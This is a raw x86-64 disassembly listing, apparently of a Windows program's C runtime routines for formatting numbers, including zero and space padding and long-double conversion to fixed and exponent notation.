   140004d9e:	8b 40 08             	mov    0x8(%rax),%eax
   140004da1:	25 00 06 00 00       	and    $0x600,%eax
   140004da6:	3d 00 02 00 00       	cmp    $0x200,%eax
   140004dab:	75 28                	jne    0x140004dd5
   140004dad:	eb 11                	jmp    0x140004dc0
   140004daf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004db3:	48 89 c2             	mov    %rax,%rdx
   140004db6:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004dbb:	e8 d0 ed ff ff       	call   0x140003b90
   140004dc0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004dc4:	8b 40 0c             	mov    0xc(%rax),%eax
   140004dc7:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004dca:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004dce:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140004dd1:	85 c0                	test   %eax,%eax
   140004dd3:	7f da                	jg     0x140004daf
   140004dd5:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004dd9:	0f 8e a7 00 00 00    	jle    0x140004e86
   140004ddf:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004de3:	0f b6 00             	movzbl (%rax),%eax
   140004de6:	84 c0                	test   %al,%al
   140004de8:	74 14                	je     0x140004dfe
   140004dea:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004dee:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004df2:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004df6:	0f b6 00             	movzbl (%rax),%eax
   140004df9:	0f be c0             	movsbl %al,%eax
   140004dfc:	eb 05                	jmp    0x140004e03
   140004dfe:	b8 30 00 00 00       	mov    $0x30,%eax
   140004e03:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004e07:	89 c1                	mov    %eax,%ecx
   140004e09:	e8 82 ed ff ff       	call   0x140003b90
   140004e0e:	83 6d 20 01          	subl   $0x1,0x20(%rbp)
   140004e12:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004e16:	74 62                	je     0x140004e7a
   140004e18:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004e1c:	8b 40 08             	mov    0x8(%rax),%eax
   140004e1f:	25 00 10 00 00       	and    $0x1000,%eax
   140004e24:	85 c0                	test   %eax,%eax
   140004e26:	74 52                	je     0x140004e7a
   140004e28:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004e2c:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140004e30:	66 85 c0             	test   %ax,%ax
   140004e33:	74 45                	je     0x140004e7a
   140004e35:	8b 4d 20             	mov    0x20(%rbp),%ecx
   140004e38:	48 63 c1             	movslq %ecx,%rax
   140004e3b:	48 69 c0 56 55 55 55 	imul   $0x55555556,%rax,%rax
   140004e42:	48 c1 e8 20          	shr    $0x20,%rax
   140004e46:	48 89 c2             	mov    %rax,%rdx
   140004e49:	89 c8                	mov    %ecx,%eax
   140004e4b:	c1 f8 1f             	sar    $0x1f,%eax
   140004e4e:	29 c2                	sub    %eax,%edx
   140004e50:	89 d0                	mov    %edx,%eax
   140004e52:	01 c0                	add    %eax,%eax
   140004e54:	01 d0                	add    %edx,%eax
   140004e56:	29 c1                	sub    %eax,%ecx
   140004e58:	89 ca                	mov    %ecx,%edx
   140004e5a:	85 d2                	test   %edx,%edx
   140004e5c:	75 1c                	jne    0x140004e7a
   140004e5e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004e62:	48 83 c0 20          	add    $0x20,%rax
   140004e66:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004e6a:	49 89 d0             	mov    %rdx,%r8
   140004e6d:	ba 01 00 00 00       	mov    $0x1,%edx
   140004e72:	48 89 c1             	mov    %rax,%rcx
   140004e75:	e8 1f ef ff ff       	call   0x140003d99
   140004e7a:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004e7e:	0f 8f 5b ff ff ff    	jg     0x140004ddf
   140004e84:	eb 11                	jmp    0x140004e97
   140004e86:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004e8a:	48 89 c2             	mov    %rax,%rdx
   140004e8d:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004e92:	e8 f9 ec ff ff       	call   0x140003b90
   140004e97:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004e9b:	8b 40 10             	mov    0x10(%rax),%eax
   140004e9e:	85 c0                	test   %eax,%eax
   140004ea0:	7f 10                	jg     0x140004eb2
   140004ea2:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ea6:	8b 40 08             	mov    0x8(%rax),%eax
   140004ea9:	25 00 08 00 00       	and    $0x800,%eax
   140004eae:	85 c0                	test   %eax,%eax
   140004eb0:	74 0c                	je     0x140004ebe
   140004eb2:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004eb6:	48 89 c1             	mov    %rax,%rcx
   140004eb9:	e8 fd f9 ff ff       	call   0x1400048bb
   140004ebe:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004ec2:	79 5f                	jns    0x140004f23
   140004ec4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ec8:	8b 50 10             	mov    0x10(%rax),%edx
   140004ecb:	8b 45 20             	mov    0x20(%rbp),%eax
   140004ece:	01 c2                	add    %eax,%edx
   140004ed0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ed4:	89 50 10             	mov    %edx,0x10(%rax)
   140004ed7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004edb:	48 89 c2             	mov    %rax,%rdx
   140004ede:	b9 30 00 00 00       	mov    $0x30,%ecx
   140004ee3:	e8 a8 ec ff ff       	call   0x140003b90
   140004ee8:	83 45 20 01          	addl   $0x1,0x20(%rbp)
   140004eec:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004ef0:	78 e5                	js     0x140004ed7
   140004ef2:	eb 2f                	jmp    0x140004f23
   140004ef4:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004ef8:	0f b6 00             	movzbl (%rax),%eax
   140004efb:	84 c0                	test   %al,%al
   140004efd:	74 14                	je     0x140004f13
   140004eff:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004f03:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004f07:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004f0b:	0f b6 00             	movzbl (%rax),%eax
   140004f0e:	0f be c0             	movsbl %al,%eax
   140004f11:	eb 05                	jmp    0x140004f18
   140004f13:	b8 30 00 00 00       	mov    $0x30,%eax
   140004f18:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004f1c:	89 c1                	mov    %eax,%ecx
   140004f1e:	e8 6d ec ff ff       	call   0x140003b90
   140004f23:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004f27:	8b 40 10             	mov    0x10(%rax),%eax
   140004f2a:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004f2d:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004f31:	89 4a 10             	mov    %ecx,0x10(%rdx)
   140004f34:	85 c0                	test   %eax,%eax
   140004f36:	7f bc                	jg     0x140004ef4
   140004f38:	90                   	nop
   140004f39:	90                   	nop
   140004f3a:	48 83 c4 30          	add    $0x30,%rsp
   140004f3e:	5d                   	pop    %rbp
   140004f3f:	c3                   	ret
   140004f40:	55                   	push   %rbp
   140004f41:	48 89 e5             	mov    %rsp,%rbp
   140004f44:	48 83 ec 50          	sub    $0x50,%rsp
   140004f48:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004f4b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004f4f:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140004f53:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140004f57:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   140004f5e:	83 6d 20 01          	subl   $0x1,0x20(%rbp)
   140004f62:	8b 45 20             	mov    0x20(%rbp),%eax
   140004f65:	48 98                	cltq
   140004f67:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004f6b:	eb 04                	jmp    0x140004f71
   140004f6d:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140004f71:	8b 45 20             	mov    0x20(%rbp),%eax
   140004f74:	48 63 d0             	movslq %eax,%rdx
   140004f77:	48 69 d2 67 66 66 66 	imul   $0x66666667,%rdx,%rdx
   140004f7e:	48 c1 ea 20          	shr    $0x20,%rdx
   140004f82:	89 d1                	mov    %edx,%ecx
   140004f84:	c1 f9 02             	sar    $0x2,%ecx
   140004f87:	99                   	cltd
   140004f88:	89 c8                	mov    %ecx,%eax
   140004f8a:	29 d0                	sub    %edx,%eax
   140004f8c:	89 45 20             	mov    %eax,0x20(%rbp)
   140004f8f:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004f93:	75 d8                	jne    0x140004f6d
   140004f95:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004f99:	8b 40 2c             	mov    0x2c(%rax),%eax
   140004f9c:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004f9f:	75 0b                	jne    0x140004fac
   140004fa1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fa5:	c7 40 2c 02 00 00 00 	movl   $0x2,0x2c(%rax)
   140004fac:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fb0:	8b 40 2c             	mov    0x2c(%rax),%eax
   140004fb3:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   140004fb6:	7d 0a                	jge    0x140004fc2
   140004fb8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fbc:	8b 40 2c             	mov    0x2c(%rax),%eax
   140004fbf:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140004fc2:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fc6:	8b 40 0c             	mov    0xc(%rax),%eax
   140004fc9:	83 45 fc 02          	addl   $0x2,-0x4(%rbp)
   140004fcd:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   140004fd0:	7d 15                	jge    0x140004fe7
   140004fd2:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fd6:	8b 40 0c             	mov    0xc(%rax),%eax
   140004fd9:	2b 45 fc             	sub    -0x4(%rbp),%eax
   140004fdc:	89 c2                	mov    %eax,%edx
   140004fde:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004fe2:	89 50 0c             	mov    %edx,0xc(%rax)
   140004fe5:	eb 0b                	jmp    0x140004ff2
   140004fe7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004feb:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004ff2:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140004ff6:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140004ffa:	8b 45 10             	mov    0x10(%rbp),%eax
   140004ffd:	49 89 c9             	mov    %rcx,%r9
   140005000:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005006:	89 c1                	mov    %eax,%ecx
   140005008:	e8 69 fb ff ff       	call   0x140004b76
   14000500d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005011:	8b 50 2c             	mov    0x2c(%rax),%edx
   140005014:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005018:	89 50 10             	mov    %edx,0x10(%rax)
   14000501b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000501f:	8b 40 08             	mov    0x8(%rax),%eax
   140005022:	0d c0 01 00 00       	or     $0x1c0,%eax
   140005027:	89 c2                	mov    %eax,%edx
   140005029:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000502d:	89 50 08             	mov    %edx,0x8(%rax)
   140005030:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005034:	8b 40 08             	mov    0x8(%rax),%eax
   140005037:	83 e0 20             	and    $0x20,%eax
   14000503a:	83 c8 45             	or     $0x45,%eax
   14000503d:	89 c1                	mov    %eax,%ecx
   14000503f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005043:	48 89 c2             	mov    %rax,%rdx
   140005046:	e8 45 eb ff ff       	call   0x140003b90
   14000504b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000504f:	8b 40 0c             	mov    0xc(%rax),%eax
   140005052:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140005055:	83 ea 01             	sub    $0x1,%edx
   140005058:	01 c2                	add    %eax,%edx
   14000505a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000505e:	89 50 0c             	mov    %edx,0xc(%rax)
   140005061:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140005065:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140005069:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000506d:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140005071:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140005075:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140005079:	48 89 c1             	mov    %rax,%rcx
   14000507c:	e8 8d ef ff ff       	call   0x14000400e
   140005081:	90                   	nop
   140005082:	48 83 c4 50          	add    $0x50,%rsp
   140005086:	5d                   	pop    %rbp
   140005087:	c3                   	ret
   140005088:	55                   	push   %rbp
   140005089:	53                   	push   %rbx
   14000508a:	48 83 ec 58          	sub    $0x58,%rsp
   14000508e:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140005093:	48 89 cb             	mov    %rcx,%rbx
   140005096:	db 2b                	fldt   (%rbx)
   140005098:	db 7d e0             	fstpt  -0x20(%rbp)
   14000509b:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000509f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400050a3:	8b 40 10             	mov    0x10(%rax),%eax
   1400050a6:	85 c0                	test   %eax,%eax
   1400050a8:	79 0b                	jns    0x1400050b5
   1400050aa:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400050ae:	c7 40 10 06 00 00 00 	movl   $0x6,0x10(%rax)
   1400050b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400050b9:	8b 50 10             	mov    0x10(%rax),%edx
   1400050bc:	db 6d e0             	fldt   -0x20(%rbp)
   1400050bf:	db 7d d0             	fstpt  -0x30(%rbp)
   1400050c2:	4c 8d 45 f4          	lea    -0xc(%rbp),%r8
   1400050c6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400050ca:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400050ce:	4d 89 c1             	mov    %r8,%r9
   1400050d1:	49 89 c8             	mov    %rcx,%r8
   1400050d4:	48 89 c1             	mov    %rax,%rcx
   1400050d7:	e8 8d f7 ff ff       	call   0x140004869
   1400050dc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400050e0:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400050e3:	3d 00 80 ff ff       	cmp    $0xffff8000,%eax
   1400050e8:	75 17                	jne    0x140005101
   1400050ea:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400050ed:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1400050f1:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400050f5:	49 89 c8             	mov    %rcx,%r8
   1400050f8:	89 c1                	mov    %eax,%ecx
   1400050fa:	e8 8c f9 ff ff       	call   0x140004a8b
   1400050ff:	eb 43                	jmp    0x140005144
   140005101:	8b 4d f0             	mov    -0x10(%rbp),%ecx
   140005104:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140005107:	4c 8b 45 28          	mov    0x28(%rbp),%r8
   14000510b:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   14000510f:	4d 89 c1             	mov    %r8,%r9
   140005112:	41 89 c8             	mov    %ecx,%r8d
   140005115:	89 c1                	mov    %eax,%ecx
   140005117:	e8 5a fa ff ff       	call   0x140004b76
   14000511c:	eb 11                	jmp    0x14000512f
   14000511e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005122:	48 89 c2             	mov    %rax,%rdx
   140005125:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000512a:	e8 61 ea ff ff       	call   0x140003b90
   14000512f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005133:	8b 40 0c             	mov    0xc(%rax),%eax
   140005136:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140005139:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   14000513d:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140005140:	85 c0                	test   %eax,%eax
   140005142:	7f da                	jg     0x14000511e
   140005144:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140005148:	48 89 c1             	mov    %rax,%rcx
   14000514b:	e8 2f 17 00 00       	call   0x14000687f
   140005150:	90                   	nop
   140005151:	48 83 c4 58          	add    $0x58,%rsp
   140005155:	5b                   	pop    %rbx
   140005156:	5d                   	pop    %rbp
   140005157:	c3                   	ret
   140005158:	55                   	push   %rbp
   140005159:	53                   	push   %rbx
   14000515a:	48 83 ec 58          	sub    $0x58,%rsp
   14000515e:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140005163:	48 89 cb             	mov    %rcx,%rbx
   140005166:	db 2b                	fldt   (%rbx)
   140005168:	db 7d e0             	fstpt  -0x20(%rbp)
   14000516b:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000516f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005173:	8b 40 10             	mov    0x10(%rax),%eax
   140005176:	85 c0                	test   %eax,%eax
   140005178:	79 0b                	jns    0x140005185
   14000517a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000517e:	c7 40 10 06 00 00 00 	movl   $0x6,0x10(%rax)
   140005185:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005189:	8b 40 10             	mov    0x10(%rax),%eax
   14000518c:	8d 50 01             	lea    0x1(%rax),%edx
   14000518f:	db 6d e0             	fldt   -0x20(%rbp)
   140005192:	db 7d d0             	fstpt  -0x30(%rbp)
   140005195:	4c 8d 45 f4          	lea    -0xc(%rbp),%r8
   140005199:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000519d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400051a1:	4d 89 c1             	mov    %r8,%r9
   1400051a4:	49 89 c8             	mov    %rcx,%r8
   1400051a7:	48 89 c1             	mov    %rax,%rcx
   1400051aa:	e8 68 f6 ff ff       	call   0x140004817
   1400051af:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400051b3:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400051b6:	3d 00 80 ff ff       	cmp    $0xffff8000,%eax
   1400051bb:	75 17                	jne    0x1400051d4
   1400051bd:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400051c0:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1400051c4:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400051c8:	49 89 c8             	mov    %rcx,%r8
   1400051cb:	89 c1                	mov    %eax,%ecx
   1400051cd:	e8 b9 f8 ff ff       	call   0x140004a8b
   1400051d2:	eb 1b                	jmp    0x1400051ef
   1400051d4:	8b 4d f0             	mov    -0x10(%rbp),%ecx
   1400051d7:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400051da:	4c 8b 45 28          	mov    0x28(%rbp),%r8
   1400051de:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400051e2:	4d 89 c1             	mov    %r8,%r9
   1400051e5:	41 89 c8             	mov    %ecx,%r8d
   1400051e8:	89 c1                	mov    %eax,%ecx
   1400051ea:	e8 51 fd ff ff       	call   0x140004f40
   1400051ef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400051f3:	48 89 c1             	mov    %rax,%rcx
   1400051f6:	e8 84 16 00 00       	call   0x14000687f
   1400051fb:	90                   	nop
   1400051fc:	48 83 c4 58          	add    $0x58,%rsp
   140005200:	5b                   	pop    %rbx
   140005201:	5d                   	pop    %rbp
   140005202:	c3                   	ret
   140005203:	55                   	push   %rbp
   140005204:	53                   	push   %rbx
   140005205:	48 83 ec 58          	sub    $0x58,%rsp
   140005209:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000520e:	48 89 cb             	mov    %rcx,%rbx
   140005211:	db 2b                	fldt   (%rbx)
   140005213:	db 7d e0             	fstpt  -0x20(%rbp)
   140005216:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000521a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000521e:	8b 40 10             	mov    0x10(%rax),%eax
   140005221:	85 c0                	test   %eax,%eax
   140005223:	79 0d                	jns    0x140005232
   140005225:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005229:	c7 40 10 06 00 00 00 	movl   $0x6,0x10(%rax)
   140005230:	eb 16                	jmp    0x140005248
   140005232:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005236:	8b 40 10             	mov    0x10(%rax),%eax
   140005239:	85 c0                	test   %eax,%eax
   14000523b:	75 0b                	jne    0x140005248
   14000523d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005241:	c7 40 10 01 00 00 00 	movl   $0x1,0x10(%rax)
   140005248:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000524c:	8b 50 10             	mov    0x10(%rax),%edx
   14000524f:	db 6d e0             	fldt   -0x20(%rbp)
   140005252:	db 7d d0             	fstpt  -0x30(%rbp)
   140005255:	4c 8d 45 f4          	lea    -0xc(%rbp),%r8
   140005259:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000525d:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140005261:	4d 89 c1             	mov    %r8,%r9
   140005264:	49 89 c8             	mov    %rcx,%r8
   140005267:	48 89 c1             	mov    %rax,%rcx
   14000526a:	e8 a8 f5 ff ff       	call   0x140004817
   14000526f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005273:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140005276:	3d 00 80 ff ff       	cmp    $0xffff8000,%eax
   14000527b:	75 1a                	jne    0x140005297
   14000527d:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140005280:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140005284:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140005288:	49 89 c8             	mov    %rcx,%r8
   14000528b:	89 c1                	mov    %eax,%ecx
   14000528d:	e8 f9 f7 ff ff       	call   0x140004a8b
   140005292:	e9 2b 01 00 00       	jmp    0x1400053c2
   140005297:	8b 45 f0             	mov    -0x10(%rbp),%eax
   14000529a:	83 f8 fd             	cmp    $0xfffffffd,%eax
   14000529d:	0f 8c c9 00 00 00    	jl     0x14000536c
   1400052a3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052a7:	8b 50 10             	mov    0x10(%rax),%edx
   1400052aa:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400052ad:	39 c2                	cmp    %eax,%edx
   1400052af:	0f 8c b7 00 00 00    	jl     0x14000536c
   1400052b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052b9:	8b 40 08             	mov    0x8(%rax),%eax
   1400052bc:	25 00 08 00 00       	and    $0x800,%eax
   1400052c1:	85 c0                	test   %eax,%eax
   1400052c3:	74 15                	je     0x1400052da
   1400052c5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052c9:	8b 50 10             	mov    0x10(%rax),%edx
   1400052cc:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400052cf:	29 c2                	sub    %eax,%edx
   1400052d1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052d5:	89 50 10             	mov    %edx,0x10(%rax)
   1400052d8:	eb 4d                	jmp    0x140005327
   1400052da:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400052de:	48 89 c1             	mov    %rax,%rcx
   1400052e1:	e8 42 4e 00 00       	call   0x14000a128
   1400052e6:	89 c1                	mov    %eax,%ecx
   1400052e8:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400052eb:	89 c2                	mov    %eax,%edx
   1400052ed:	89 c8                	mov    %ecx,%eax
   1400052ef:	29 d0                	sub    %edx,%eax
   1400052f1:	89 c2                	mov    %eax,%edx
   1400052f3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052f7:	89 50 10             	mov    %edx,0x10(%rax)
   1400052fa:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400052fe:	8b 40 10             	mov    0x10(%rax),%eax
   140005301:	85 c0                	test   %eax,%eax
   140005303:	79 22                	jns    0x140005327
   140005305:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005309:	8b 40 0c             	mov    0xc(%rax),%eax
   14000530c:	85 c0                	test   %eax,%eax
   14000530e:	7e 17                	jle    0x140005327
   140005310:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005314:	8b 50 0c             	mov    0xc(%rax),%edx
   140005317:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000531b:	8b 40 10             	mov    0x10(%rax),%eax
   14000531e:	01 c2                	add    %eax,%edx
   140005320:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005324:	89 50 0c             	mov    %edx,0xc(%rax)
   140005327:	8b 4d f0             	mov    -0x10(%rbp),%ecx
   14000532a:	8b 45 f4             	mov    -0xc(%rbp),%eax
   14000532d:	4c 8b 45 28          	mov    0x28(%rbp),%r8
   140005331:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140005335:	4d 89 c1             	mov    %r8,%r9
   140005338:	41 89 c8             	mov    %ecx,%r8d
   14000533b:	89 c1                	mov    %eax,%ecx
   14000533d:	e8 34 f8 ff ff       	call   0x140004b76
   140005342:	eb 11                	jmp    0x140005355
   140005344:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005348:	48 89 c2             	mov    %rax,%rdx
   14000534b:	b9 20 00 00 00       	mov    $0x20,%ecx
   140005350:	e8 3b e8 ff ff       	call   0x140003b90
   140005355:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005359:	8b 40 0c             	mov    0xc(%rax),%eax
   14000535c:	8d 48 ff             	lea    -0x1(%rax),%ecx
   14000535f:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140005363:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140005366:	85 c0                	test   %eax,%eax
   140005368:	7f da                	jg     0x140005344
   14000536a:	eb 56                	jmp    0x1400053c2
   14000536c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005370:	8b 40 08             	mov    0x8(%rax),%eax
   140005373:	25 00 08 00 00       	and    $0x800,%eax
   140005378:	85 c0                	test   %eax,%eax
   14000537a:	74 13                	je     0x14000538f
   14000537c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005380:	8b 40 10             	mov    0x10(%rax),%eax
   140005383:	8d 50 ff             	lea    -0x1(%rax),%edx
   140005386:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000538a:	89 50 10             	mov    %edx,0x10(%rax)
   14000538d:	eb 18                	jmp    0x1400053a7
   14000538f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140005393:	48 89 c1             	mov    %rax,%rcx
   140005396:	e8 8d 4d 00 00       	call   0x14000a128
   14000539b:	83 e8 01             	sub    $0x1,%eax
   14000539e:	89 c2                	mov    %eax,%edx
   1400053a0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400053a4:	89 50 10             	mov    %edx,0x10(%rax)
   1400053a7:	8b 4d f0             	mov    -0x10(%rbp),%ecx
   1400053aa:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400053ad:	4c 8b 45 28          	mov    0x28(%rbp),%r8
   1400053b1:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400053b5:	4d 89 c1             	mov    %r8,%r9
   1400053b8:	41 89 c8             	mov    %ecx,%r8d
   1400053bb:	89 c1                	mov    %eax,%ecx
   1400053bd:	e8 7e fb ff ff       	call   0x140004f40
   1400053c2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400053c6:	48 89 c1             	mov    %rax,%rcx
   1400053c9:	e8 b1 14 00 00       	call   0x14000687f
   1400053ce:	90                   	nop
   1400053cf:	48 83 c4 58          	add    $0x58,%rsp
   1400053d3:	5b                   	pop    %rbx
   1400053d4:	5d                   	pop    %rbp
   1400053d5:	c3                   	ret
   1400053d6:	55                   	push   %rbp
   1400053d7:	53                   	push   %rbx
   1400053d8:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400053df:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400053e6:	00 
   1400053e7:	48 89 cb             	mov    %rcx,%rbx
   1400053ea:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   1400053ee:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400053f2:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400053f6:	66 c7 45 f6 02 00    	movw   $0x2,-0xa(%rbp)
   1400053fc:	48 8b 03             	mov    (%rbx),%rax
   1400053ff:	48 85 c0             	test   %rax,%rax
   140005402:	75 09                	jne    0x14000540d
   140005404:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   140005408:	66 85 c0             	test   %ax,%ax
   14000540b:	74 0b                	je     0x140005418
   14000540d:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   140005411:	83 e8 03             	sub    $0x3,%eax
   140005414:	66 89 43 08          	mov    %ax,0x8(%rbx)
   140005418:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000541c:	8b 40 10             	mov    0x10(%rax),%eax
   14000541f:	85 c0                	test   %eax,%eax
   140005421:	0f 88 90 00 00 00    	js     0x1400054b7
   140005427:	48 8b 45 28          	mov    0x28(%rbp),%rax
